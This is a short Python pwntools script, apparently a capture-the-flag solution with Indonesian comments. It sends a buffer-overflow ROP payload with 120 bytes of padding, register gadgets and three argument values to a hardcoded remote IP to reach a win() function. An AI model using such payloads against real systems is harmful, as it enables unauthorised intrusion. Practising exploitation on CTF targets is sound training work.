from pwn import *

# Ganti alamat IP dan port sesuai dengan pengaturan Anda
host = '103.185.44.122'
port = 19001

# Ganti ini dengan alamat fungsi win() yang telah Anda temukan
win = 0x401227

# Argumen untuk fungsi win() dan regs
a = 0xdeadbeefdeadbeef
b = 0xabcd1234dcba4321
c = 0x147147147147147
rdi = p64(0x40121e)
rsi = p64(0x401220)
rdx = p64(0x401222)
nop = p64(0x401224)
# Offset untuk mencapai alamat pengembalian
offset = 120

# Membuat payload yang terdiri dari data untuk buffer overflow, alamat pengembalian, argumen untuk fungsi win(), dan regs
payload = b'A' * offset + rdi + rsi + rdx + p64(a) + p64(b) + p64(c) + p64(win)

# Membuat koneksi ke server
conn = remote(host, port)

# Baca prompt dari server
conn.recvuntil(b'Give me your payload: ')

# Kirim payload
conn.send(payload)

# Terima dan cetak respons dari server
conn.interactive()
